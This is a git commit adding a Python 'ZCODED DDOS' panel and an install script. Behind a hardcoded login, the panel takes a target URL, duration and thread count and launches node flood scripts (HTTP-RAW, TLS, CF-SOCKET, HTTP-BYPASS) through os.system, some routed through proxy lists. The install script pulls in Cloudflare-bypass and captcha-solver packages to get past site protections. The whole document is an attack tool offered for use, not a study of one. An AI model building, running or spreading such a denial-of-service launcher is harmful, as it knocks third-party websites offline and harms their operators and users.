814b5058f0adbf66a0c7b441a33342cef86779d1
Yasuo <140517921+ThPYasuo@users.noreply.github.com>
2023-09-17 13:58:18 +0800

    Add files via upload

---
+++ ZCODED.py
@@ -0,0 +1,330 @@
+#CODED BY ZCODED X YASUO
+
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+proxys = open('proxy.txt').readlines()
+bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(f'''
+     / **/|        
+     | == /        
+      |  |         
+      |  |         
+      |  /         
+       |/  
+
+
+
+
+
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+     / **/|        
+     | == /        
+      |  |         
+      |  |         
+      |  /         
+       |/  
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+
+
+
+
+     / **/|        
+     | == /        
+      |  |                  
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f"""
+
+     _.-^^---....,,--       
+ _--                  --_  
+<                        >)
+|                         | 
+ \._                   _./  
+    ```--. . , ; .--'''       
+          | |   |             
+       .-=||  | |=-.   
+       `-=#$%&%$#=-'   
+          | ;  :|     
+ _____.,-#%&$@%#&#~,._____
+    """)
+    time.sleep(0.8)
+    clear()
+
+def si():
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZCODED \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZCODED DDOS \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: ZCODED \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print("")
+
+
+def banners():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')
+
+
+
+
+    
+def layer7():
+    clear()
+    si()
+    print(f'''
+          
+╔════════════════════════════════╗
+║ HTTP-RAW             <EMPTY>        ║
+╠════════════════════════════════╣
+║ HTTP-SOCKET          <EMPTY>        ║
+╠════════════════════════════════╣
+║ TLS-STRONG           <EMPTY>        ║
+╠════════════════════════════════╣ 
+║ TLS                  <EMPTY>        ║
+╠════════════════════════════════╣
+║ CF-SOCKET            <EMPTY>        ║  
+╠════════════════════════════════╣
+║ HTTP-BYPASS          <EMPTY>        ║
+╚════════════════════════════════╝ 
+
+''')
+    
+def developers():
+    clear()
+    si()
+    print(f'''
+         ╔══════════════════╗
+         ║~DEVELOPER:ZCODED    ║
+         ╚══════════════════╝ 
+''')
+
+
+
+def menu():
+    sys.stdout.write(f"         \x1b]2;ZCODED DDOS --> Stars: [{bots}] | Online Users: [1] | Methods: [10]\x07")
+    clear()
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZCODED \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZCODED DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: ZCODED \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print("")
+    print("""
+              \x1b[38;2;255;0;255m╔═╗\x1b[38;2;255;0;255m╔═╗\x1b[38;2;255;0;255m╔═╗\x1b[38;2;0;113;133m╔╦╗\x1b[38;2;0;83;168m╔═╗\x1b[38;2;0;49;147m╔╦╗ 
+              \x1b[38;2;255;0;255m╔═╝\x1b[38;2;255;0;255m║  \x1b[38;2;255;0;255m║ ║\x1b[38;2;0;113;133m ║║\x1b[38;2;0;83;168m║╣ \x1b[38;2;0;49;147m ║║
+              \x1b[38;2;255;0;255m╚═╝\x1b[38;2;255;0;255m╚═╝\x1b[38;2;255;0;255m╚═╝\x1b[38;2;0;113;133m═╩╝\x1b[38;2;0;83;168m╚═╝\x1b[38;2;0;49;147m═╩╝
+            \x1b[38;2;249;6;255m╚═══\x1b[38;2;243;12;255m╦═\x1b[38;2;231;24;255m══\x1b[38;2;219;36;255m══\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╦\x1b[38;2;69;186;255m══╝
+            \x1b[38;2;0;212;14m╔════════\x1b[38;2;0;186;45m════\x1b[38;2;0;150;88m════════╗
+            \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239m---ZCODED DDOS PANEL  \x1b[38;2;0;49;147m║
+            \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mFree DDoS Panel 2023  \x1b[38;2;0;49;147m║
+            \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mFree DDoS Panel 2022  \x1b[38;2;0;49;147m║
+            \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mFree DDoS Panel 2022  \x1b[38;2;0;49;147m║
+            \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m═════\x1b[38;2;0;150;88m════════╝
+""")
+
+def main():
+    menu()
+    while(True):
+        cnc = input('''\x1b[38;2;255;0;0m╔══[root\x1b[38;2;255;0;0m@z\x1b[38;2;255;0;0mc\x1b[38;2;255;0;0moded\x1b[38;2;255;0;0m]
+\x1b[38;2;255;0;0m╚\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m═\x1b[38;2;255;0;0m➤ \x1b[38;2;255;0;0m''')
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            layer7()
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            main()
+        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
+            banners()
+        elif cnc == "DEVELOPER" or cnc == "DEV" or cnc == "Dev" or cnc == "DEVELOP" or cnc == "dev":
+             developers()
+   
+
+       
+# LAYER 7 METHODS
+ 
+        elif "HTTP-RAW" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                threads = cnc.split()[3]
+                os.system(f'node methods/HTTP-RAW.js {url} {time} {threads}')
+            except IndexError:
+                print('Usage: HTTP-RAW <url> <time> <threads>')
+                print('Example: HTTP-RAW http://example.com 60 10')
+        
+        elif "HTTP-SOCKET" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                threads = cnc.split()[3]
+                os.system(f'node methods/HTTP-SOCKET.js {url} {time} {threads}')
+            except IndexError:
+                print('Usage: HTTP-SOCKET <url> <time> <threads>')
+                print('Example: HTTP-SOCKET http://example.org 60 5')
+                
+        elif "HTTP-BYPASS" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                threads = cnc.split()[3]
+                proxyfile = cnc.split()[4]
+                os.system(f'node methods/HTTP-BYPASS.js {url} {time} {threads} {proxyfile}')
+            except IndexError:
+                print('Usage: HTTP-BYPASS [URL] [TIME] [THREADS] [PROXYFILE]')
+                print('Example: HTTP-BYPASS https://target.com 60 10 proxy.txt')
+                
+        elif "TLS" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                request = cnc.split()[3]
+                thread = cnc.split()[4]
+                proxyfile = cnc.split()[5]
+                os.system(f'node methods/TLS.js {url} {time} {request} {thread} {proxyfile}')
+            except IndexError:
+                print('Usage: TLS [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]')
+                print('Example: https://tls.mrrage.xyz/nginx_status 50 124 5 proxy.txt')
+
+        elif "TLS-STRONG" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                req_per_ip = cnc.split()[3]
+                threads = cnc.split()[4]
+                os.system(f'node methods/TLS-STRONG.js {url} {time} {req_per_ip} {threads} ')
+            except IndexError:
+                print('Usage: TLS-STRONG <url> <time> <req_per_ip> <threads>')
+                print('Example: TLS-STRONG http://example.com 60 124 10')
+            
+        elif "CF-SOCKET" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node methods/CF-SOCKET.js {url} {time}')
+            except IndexError:
+                print('Usage: CF-SOCKET <url> <time>')
+                print('Example: CF-SOCKET http://example.com 60')
+# BANNERS
+
+        elif "troll" in cnc:
+                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
+                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
+                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
+                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
+                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
+                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
+                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
+                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
+                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
+                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
+                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
+                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
+                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
+                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
+                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')
+
+        elif "pikachu" in cnc:
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
+                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
+                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
+                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
+                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')
+
+                
+# TOOLS
+        
+
+        elif "help" in cnc:
+            print(f'''
+╔════════════════╗
+║~~~~~LAYER 7~~~~~~~║
+╚════════════════╝ 
+╔════════════════╗
+║~~~~~BANNER~~~~~~~~║
+╚════════════════╝ 
+╔════════════════╗
+║~~~~~~CLEAR~~~~~~~~║
+╚════════════════╝ 
+╔════════════════╗
+║~~~~~DEVELOPER~~~~~║
+╚════════════════╝ 
+            ''')
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
+def login():
+    clear()
+    user = "ZCODED"
+    passwd = "ZCODED"
+    username = input("⚡ Username: ")
+    password = getpass.getpass(prompt='⚡ Password: ')
+    if username != user or password != passwd:
+        print("")
+        print("⚡ ZCODED, you're so cute...")
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("⚡ Welcome to ZCODED DDOS!")
+        time.sleep(0.3)
+        ascii_vro()
+        main()
+
+login()
---
+++ install.sh
@@ -0,0 +1,11 @@
+sudo apt -y update; sudo apt -y install screen git nodejs
+npm i cloudscraper
+npm i fs
+npm i hcaptcha-solver
+npm i https-proxy-agent
+npm i user-agents
+npm i cloudflare-bypasser
+npm i http http2 crypto tls
+npm i net
+npm i fake-useragents
+pip install -r requirements.txt
